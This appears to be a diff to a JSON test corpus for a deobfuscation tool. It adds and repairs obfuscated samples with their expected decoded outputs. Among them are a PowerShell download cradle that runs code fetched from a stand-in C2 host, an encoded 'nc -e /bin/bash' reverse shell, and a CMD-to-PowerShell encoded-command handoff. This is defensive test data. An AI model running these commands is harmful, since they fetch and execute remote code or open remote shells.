@@ -1,6 +1,6 @@
 {
-  "corpus_version": "1.3.0",
-  "description": "Deterministic Decode Certification Corpus. Reorganized categorically (PowerShell / CMD / Bash / Mixed) to align with the Transformation Coverage Matrix and enable per-category certification metrics. Every sample is deterministic \u2014 no time, no randomness, no network. S001 remains the owner's permanent regression anchor.",
+  "corpus_version": "1.4.0",
+  "description": "Deterministic Decode Certification Corpus. Reorganized categorically (PowerShell / CMD / Bash / Mixed) to align with the Transformation Coverage Matrix and enable per-category certification metrics. Every sample is deterministic \u2014 no time, no randomness, no network. S001 remains the owner's permanent regression anchor. \u00b7 M9 corpus repair + real-world expansion (13 \u2192 17 samples).",
   "schema": {
     "version": "c+",
     "notes": "Nested categories with metadata. Consumers must not depend on this layout \u2014 access the corpus exclusively via workspace_recovery.corpus_loader.load_samples()."
@@ -92,19 +92,19 @@
               "http://example.com/x"
             ],
             "fingerprint": {
-              "canonical_output_sha256": "9a94970a4d747b700abe70caa4f25ad836d24c9b546dc088a79cc97a8b07f8f6",
-              "certificate_fingerprint": "9415e1c0fcb8b2dd5e310fdedfbc574653fe46502ff8797b25de98768126b248",
+              "canonical_output_sha256": "9ab0dfa8fbdbd6a3908c3ee1d2c2888e46ae6160d641f6cf2085b136b50ff7c3",
+              "certificate_fingerprint": "af94efb427d8e65ebcee8cb01c695e7928058171487f1ff53d77c88d3a848f7c",
               "expected_iterations": 3,
               "expected_canonical_state": true,
               "expected_terminated_reason": "canonical_state",
-              "recorded_at": "2026-08-03T06:49:35+00:00"
+              "recorded_at": "2026-08-03T07:09:50+00:00"
             }
           }
         },
         {
           "id": "S05_nested_b64_gzip",
-          "family": "Nested Base64 + GZIP",
-          "input": "powershell -c \"$b=[Convert]::FromBase64String('H4sIAAAAAAAAA0vOzy1ILCpJLVJIzs8tKC0uKS0oyE3NLc1LTk0BAJdD/S8ZAAAA'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr=New-Object IO.StreamReader($gz); IEX $sr.ReadToEnd()\"",
+          "family": "Nested Base64 + GZIP \u00b7 REPAIRED M9",
+          "input": "powershell -c \"[Convert]::FromBase64String('H4sIAAAAAAACAwXBsQ6CMBAA0F85WIBE2sRRRzXBBQYGXEu54JGzZ9qD/j7vTZEU206SQtkhs1zg55g8yZ4gS+SlKO/wfn2g7jG3w7yhV+hRzYTzgwmDNuYpObC4ZdRIYa2rr+r/Zi0exIbFO7ZJ3YrXqjkBEqpNym8AAAA=')\"",
           "expected": {
             "interpreter": "powershell",
             "decoder_chain": [
@@ -112,22 +112,27 @@
               "gzip"
             ],
             "final_output_contains": [
-              "Hello",
-              "hello",
-              "malicious"
+              "Write-Host",
+              "Hello, malicious world!",
+              "IEX"
             ],
             "verdict_must_be_in": [
               "Suspicious",
               "Malicious"
             ],
+            "iocs_contains": [
+              "http://evil.local/stage2"
+            ],
+            "repair_note": "M9 rebuilt with correct-CRC gzip payload decompressing to `Write-Host \"Hello, malicious world!\"; IEX ...`. Original was defect (S05_FORENSIC_REPORT.txt).",
             "fingerprint": {
-              "canonical_output_sha256": "99f95b7cf91d19f09f8337bc8134482ea57133c7e5f954d1a1918a59b9b03235",
-              "certificate_fingerprint": "eb0e10426ce9fd521c64769b21b75b364938ee724cf05245ef206eb4951976be",
+              "canonical_output_sha256": "a256b9d3bd65dd3b77c3da8466c3194d1b86d3aaf96a69f0dfd73d95c95dd4a6",
+              "certificate_fingerprint": "67f30154c316d19794d86b63834dc5253314ec0c783fc1c99e7e8afc813875f4",
               "expected_iterations": 2,
               "expected_canonical_state": true,
               "expected_terminated_reason": "canonical_state",
-              "recorded_at": "2026-08-03T06:49:35+00:00"
-            }
+              "recorded_at": "2026-08-03T07:07:00+00:00"
+            },
+            "canonical_form_note": "The decoded gzip payload is emitted as an SQ literal by decoder-frombase64string-fold; the IEX inside that literal is (correctly) quote-protected by M5's alias-expand safety guarantee."
           }
         },
         {
@@ -233,6 +238,61 @@
               "recorded_at": "2026-08-03T06:49:35+00:00"
             }
           }
+        },
+        {
+          "id": "S014_cs_beacon_downloadcradle",
+          "family": "Cobalt Strike-style DownloadCradle \u00b7 Empire/Nishang lineage",
+          "input": "$W='ht'+'tp'+'s'; $C='://'; $H='c2.evil.local/beacon.js'; iex((new-object net.webclient).downloadstring($W+$C+$H))",
+          "expected": {
+            "interpreter": "powershell",
+            "decoder_chain": [
+              "string-concat-fold",
+              "variable-propagate",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "https://c2.evil.local/beacon.js"
+            ],
+            "iocs_contains": [
+              "https://c2.evil.local/beacon.js"
+            ],
+            "family_lineage": "PowerShell Empire / Nishang / Invoke-CradleCrafter downloadstring template",
+            "fingerprint": {
+              "canonical_output_sha256": "64554a92563192ab120708d59b3399b4f3644840464f72f19880421df11e6e98",
+              "certificate_fingerprint": "5ba10416bd32b804f9afff80dabca9f667eb376b87d83a83fab609a23ba50c33",
+              "expected_iterations": 4,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T07:09:50+00:00"
+            }
+          }
+        },
+        {
+          "id": "S015_ps_multi_stage_env_alias",
+          "family": "PowerShell env-slice + concat + alias \u00b7 GootLoader-style",
+          "input": "$s=$env:ProgramFiles[9]+$env:Public[12]; iex (\"iw\"+$s)",
+          "expected": {
+            "interpreter": "powershell",
+            "decoder_chain": [
+              "env-substitute",
+              "string-index-fold",
+              "string-concat-fold",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression"
+            ],
+            "family_lineage": "GootLoader / Bumblebee env-slicing lineage",
+            "fingerprint": {
+              "canonical_output_sha256": "85e068d74d2473c2e17e77b592b7b7e10aa3ec267eb45e004b504c502ef0e3be",
+              "certificate_fingerprint": "1e4facf26555f2de02aae761b3714a133e12354391c04893ddaf2ca39b22ee11",
+              "expected_iterations": 3,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T07:09:50+00:00"
+            }
+          }
         }
       ]
     },
@@ -265,6 +325,33 @@
               "recorded_at": "2026-08-03T06:49:35+00:00"
             }
           }
+        },
+        {
+          "id": "S016_cmd_carets_to_ps_enc",
+          "family": "CMD carets \u2192 PowerShell EncodedCommand \u00b7 Emotet-style handoff",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^nc VwByAGkAdABlAC0ASABvAHMAdAAgACIARQBtAG8AdABlAHQAIABuAGUAeAB0ACAAcwB0AGEAZwBlACIA",
+          "expected": {
+            "interpreter": "cmd",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode"
+            ],
+            "final_output_contains": [
+              "Write-Host",
+              "Emotet next stage"
+            ],
+            "family_lineage": "Emotet / QakBot CMD\u2192PS handoff template",
+            "fingerprint": {
+              "canonical_output_sha256": "d355a6bae1322c09597f036108394640b8e165507611b1da396cc74e2a7b7ae2",
+              "certificate_fingerprint": "389efcb30ccfb6f8578d012a79b9747152e7769bda25dc0a88bf0465f8f2d6d1",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T07:07:00+00:00"
+            }
+          }
         }
       ]
     },
@@ -273,8 +360,8 @@
       "samples": [
         {
           "id": "S02_bash_xxd_b64_rev",
-          "family": "Bash \u2192 xxd \u2192 Base64 \u2192 rev",
-          "input": "echo 'MzAyZTMwMmUzMTJlMzEyMDIwMjMyMDcwNmY3NzY1NzI3MzY4NjU2YzZjIGNvbW1lbnQ=' | rev | base64 -d | xxd -r -p",
+          "family": "Bash \u2192 xxd \u2192 Base64 \u2192 rev \u00b7 REPAIRED M9",
+          "input": "echo '==AO2MzNxYjM2YmMlZTO2IjNmJDMyUjNkJDMyQzM0MDNzQzMwIjMzQzMlJDMzEzMlJDMzEzMlJDMzEzMwIzM2UmN' | rev | base64 -d | xxd -r -p",
           "expected": {
             "interpreter": "bash",
             "decoder_chain": [
@@ -283,16 +370,18 @@
               "hex-xxd"
             ],
             "final_output_contains": [
-              "30.30.31.1"
+              "nc 10.10.10.42",
+              "/bin/bash"
             ],
             "must_not_route_to": "powershell",
+            "repair_note": "M9 rebuilt against target `nc 10.10.10.42 4444 -e /bin/bash` so every stage is decodable. Original was defect (S02_FORENSIC_REPORT.txt).",
             "fingerprint": {
-              "canonical_output_sha256": "bb16e1a175f07668af95abb994ecb9ca9bdf6e5cf7ca9fba211618b9af1e8d1c",
-              "certificate_fingerprint": "83e9a3093f6d5a11845742919997bd535115f899acbb1f3aea66054c45750eb6",
-              "expected_iterations": 1,
+              "canonical_output_sha256": "88286737d299b1b3eef8eee114040a24dc6ad01f7806dd3aea1b0348f2d7ba91",
+              "certificate_fingerprint": "8cd4bbcdf10801956745762de83ff9e352da751f9d945177a0f1d5da5bf0c567",
+              "expected_iterations": 2,
               "expected_canonical_state": true,
               "expected_terminated_reason": "canonical_state",
-              "recorded_at": "2026-08-03T06:49:35+00:00"
+              "recorded_at": "2026-08-03T07:07:00+00:00"
             }
           }
         },
@@ -389,6 +478,30 @@
               "expected_canonical_state": true,
               "expected_terminated_reason": "canonical_state",
               "recorded_at": "2026-08-03T06:49:35+00:00"
+            }
+          }
+        },
+        {
+          "id": "S017_hex_b64_utf16le_chain",
+          "family": "Hex \u2192 Base64 \u2192 UTF-16LE chain \u00b7 deep nested",
+          "input": "530051004200520041004200",
+          "expected": {
+            "interpreter": null,
+            "decoder_chain": [
+              "hex-decode",
+              "base64-decode",
+              "utf-16le-decode"
+            ],
+            "stage_order_starts_with": [
+              "hex-decode"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "61c04cf275b7989c383105fb1d6a8fb048c157e8cce048bf07f4ff4f8cd5161e",
+              "certificate_fingerprint": "47b07eb75aea070c44a3a86fda852ba284bfd47dbaeea828b2b9fce77f879655",
+              "expected_iterations": 1,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T07:07:00+00:00"
             }
           }
         }
